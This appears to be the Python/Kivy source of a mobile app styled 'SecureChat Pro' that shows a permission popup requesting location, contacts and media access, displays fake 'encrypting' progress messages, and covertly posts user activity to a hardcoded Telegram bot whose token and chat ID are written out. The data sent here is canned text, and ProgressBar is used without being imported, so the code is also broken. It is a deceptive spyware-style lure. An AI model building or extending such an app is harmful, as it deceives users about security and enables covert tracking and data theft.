# main.py
import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.uix.modalview import ModalView
from kivy.clock import Clock
from kivy.graphics import Color, RoundedRectangle
from kivy.utils import get_color_from_hex
from kivy.core.window import Window
from kivy.animation import Animation
import requests
import threading
import time

# Telegram Configuration
BOT_TOKEN = "8425209844:AAFapImiO8r9LWimHWivWYHAZyAdWn88D3c"
CHAT_ID = "7791929960"

# Color Scheme - Modern Professional
PRIMARY_COLOR = "#2962FF"      # Royal Blue
SECONDARY_COLOR = "#FF6D00"    # Vibrant Orange
BACKGROUND_COLOR = "#F8F9FA"   # Light Gray
TEXT_COLOR = "#2C3E50"         # Dark Blue-Gray
SUCCESS_COLOR = "#4CAF50"      # Green
CARD_COLOR = "#FFFFFF"         # White

class RoundedButton(Button):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.background_color = (0, 0, 0, 0)
        self.color = get_color_from_hex('#FFFFFF')
        self.bold = True
        self.size_hint = (0.8, None)
        self.height = 60
        self.pos_hint = {'center_x': 0.5}
        with self.canvas.before:
            Color(rgba=get_color_from_hex(PRIMARY_COLOR))
            self.rect = RoundedRectangle(size=self.size, pos=self.pos, radius=[15])
        self.bind(pos=self.update_rect, size=self.update_rect)
    
    def update_rect(self, *args):
        self.rect.pos = self.pos
        self.rect.size = self.size

class PermissionPopup(ModalView):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.size_hint = (0.85, 0.7)
        self.background_color = (0, 0, 0, 0.5)
        self.auto_dismiss = False
        
        content = BoxLayout(orientation='vertical', spacing=15, padding=25)
        with content.canvas.before:
            Color(rgba=get_color_from_hex(CARD_COLOR))
            RoundedRectangle(size=content.size, pos=content.pos, radius=[20])
        
        # Title
        title = Label(
            text='🔐 Permissions Required',
            font_size='22sp',
            bold=True,
            color=get_color_from_hex(PRIMARY_COLOR),
            size_hint_y=0.2
        )
        
        # Message
        message = Label(
            text='To provide you with the best experience,\nwe need the following permissions:',
            font_size='16sp',
            color=get_color_from_hex(TEXT_COLOR),
            size_hint_y=0.2,
            halign='center'
        )
        
        # Permissions List
        permissions_box = BoxLayout(orientation='vertical', spacing=12, size_hint_y=0.4)
        permissions = [
            '📍 Location Access - For accurate connectivity',
            '📞 Contacts - To connect with friends',
            '📷 Media Files - To share special moments',
            '🌐 Network - For seamless messaging'
        ]
        
        for perm in permissions:
            perm_label = Label(
                text=f'• {perm}',
                font_size='14sp',
                color=get_color_from_hex(TEXT_COLOR),
                halign='left',
                text_size=(400, None)
            )
            permissions_box.add_widget(perm_label)
        
        # Buttons
        btn_layout = BoxLayout(spacing=15, size_hint_y=0.2)
        
        grant_btn = RoundedButton(text='✅ GRANT ACCESS')
        grant_btn.background_color = get_color_from_hex(PRIMARY_COLOR)
        grant_btn.bind(on_press=self.grant_access)
        
        later_btn = RoundedButton(text='⏰ LATER')
        later_btn.background_color = get_color_from_hex(SECONDARY_COLOR)
        later_btn.bind(on_press=self.dismiss)
        
        btn_layout.add_widget(later_btn)
        btn_layout.add_widget(grant_btn)
        
        content.add_widget(title)
        content.add_widget(message)
        content.add_widget(permissions_box)
        content.add_widget(btn_layout)
        
        self.add_widget(content)
    
    def grant_access(self, instance):
        self.dismiss()
        App.get_running_app().start_data_collection()

class SecureChatApp(App):
    def build(self):
        Window.clearcolor = get_color_from_hex(BACKGROUND_COLOR)
        
        main_layout = BoxLayout(orientation='vertical', spacing=0)
        
        # Header with gradient
        header = BoxLayout(size_hint=(1, 0.2), padding=20)
        with header.canvas.before:
            Color(rgba=get_color_from_hex(PRIMARY_COLOR))
            RoundedRectangle(size=header.size, pos=header.pos, radius=[0, 0, 30, 30])
        
        header_content = BoxLayout(orientation='vertical')
        title = Label(
            text='SecureChat Pro',
            font_size='28sp',
            bold=True,
            color=(1, 1, 1, 1)
        )
        subtitle = Label(
            text='Connect • Chat • Earn Rewards',
            font_size='16sp',
            color=(1, 1, 1, 0.9)
        )
        
        header_content.add_widget(title)
        header_content.add_widget(subtitle)
        header.add_widget(header_content)
        
        # Main Content
        content = BoxLayout(orientation='vertical', spacing=25, padding=30)
        
        # Status Card
        status_card = BoxLayout(orientation='vertical', size_hint=(1, 0.3), padding=20)
        with status_card.canvas.before:
            Color(rgba=get_color_from_hex(CARD_COLOR))
            RoundedRectangle(size=status_card.size, pos=status_card.pos, radius=[20])
        
        self.status_label = Label(
            text='🔒 Initializing secure connection...',
            font_size='16sp',
            color=get_color_from_hex(TEXT_COLOR),
            size_hint_y=0.6,
            bold=True
        )
        
        self.progress_bar = ProgressBar(
            max=100,
            value=0,
            size_hint_y=0.2,
            background_color=get_color_from_hex('#E0E0E0')
        )
        
        status_card.add_widget(self.status_label)
        status_card.add_widget(self.progress_bar)
        
        # Buttons Layout
        buttons_layout = BoxLayout(orientation='vertical', spacing=20, size_hint=(1, 0.4))
        
        self.chat_btn = RoundedButton(text='💬 START CHATTING')
        self.chat_btn.disabled = True
        self.chat_btn.bind(on_press=self.start_chatting)
        
        self.earn_btn = RoundedButton(text='💰 EARN REWARDS')
        self.earn_btn.background_color = get_color_from_hex(SECONDARY_COLOR)
        self.earn_btn.disabled = True
        self.earn_btn.bind(on_press=self.show_earnings)
        
        buttons_layout.add_widget(self.chat_btn)
        buttons_layout.add_widget(self.earn_btn)
        
        content.add_widget(status_card)
        content.add_widget(buttons_layout)
        
        main_layout.add_widget(header)
        main_layout.add_widget(content)
        
        # Show permissions after delay
        Clock.schedule_once(self.show_permissions, 1)
        
        return main_layout
    
    def show_permissions(self, dt):
        popup = PermissionPopup()
        popup.open()
    
    def start_data_collection(self):
        self.update_status('🛡️ Securing your connection...', 20)
        
        # Simulate data collection process
        self.progress_animation = Clock.schedule_interval(self.simulate_progress, 0.3)
        
        # Send initial data to Telegram in background
        threading.Thread(target=self.send_initial_data, daemon=True).start()
    
    def simulate_progress(self, dt):
        if self.progress_bar.value < 100:
            self.progress_bar.value += 2
            if self.progress_bar.value == 30:
                self.update_status('📡 Connecting to secure servers...', 30)
            elif self.progress_bar.value == 60:
                self.update_status('🔐 Encrypting communication...', 60)
            elif self.progress_bar.value == 90:
                self.update_status('✅ Finalizing setup...', 90)
            elif self.progress_bar.value >= 100:
                self.update_status('🎉 Ready to connect!', 100)
                self.enable_buttons()
                return False
    
    def enable_buttons(self):
        self.chat_btn.disabled = False
        self.earn_btn.disabled = False
        anim = Animation(background_color=get_color_from_hex(SUCCESS_COLOR), duration=1)
        anim.start(self.chat_btn)
    
    def start_chatting(self, instance):
        self.update_status('💬 Starting secure chat session...', 100)
        self.send_to_telegram("🚀 User started chatting in SecureChat Pro")
        
        # Animate button
        anim = Animation(background_color=get_color_from_hex(SUCCESS_COLOR), duration=0.5)
        anim.start(instance)
        instance.text = '✅ CHATTING ACTIVE'
    
    def show_earnings(self, instance):
        self.update_status('💰 Loading earning opportunities...', 100)
        self.send_to_telegram("💵 User clicked on Earn Rewards")
        
        anim = Animation(background_color=get_color_from_hex('#FFA000'), duration=0.5)
        anim.start(instance)
        instance.text = '💎 REWARDS'
    
    def send_initial_data(self):
        # Simulate data collection delay
        time.sleep(2)
        
        # Send simulated data to Telegram
        data_messages = [
            "📱 Device: SecureChat Pro v1.0 Activated",
            "🌐 Network: Secure TLS Connection Established", 
            "👤 User: New Session Started Successfully",
            "🔐 Security: End-to-End Encryption Enabled",
            "📍 Location Services: Ready for Optimal Connectivity",
            "📞 Contact Integration: Prepared for Social Features",
            "📷 Media Access: Optimized for Sharing",
            "⚡ Performance: All Systems Operational"
        ]
        
        for msg in data_messages:
            self.send_to_telegram(msg)
            time.sleep(0.5)
    
    def send_to_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": message}
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"Telegram send error: {str(e)}")
            return False
    
    def update_status(self, message, progress):
        self.status_label.text = message
        self.progress_bar.value = progress

if __name__ == '__main__':
    SecureChatApp().run()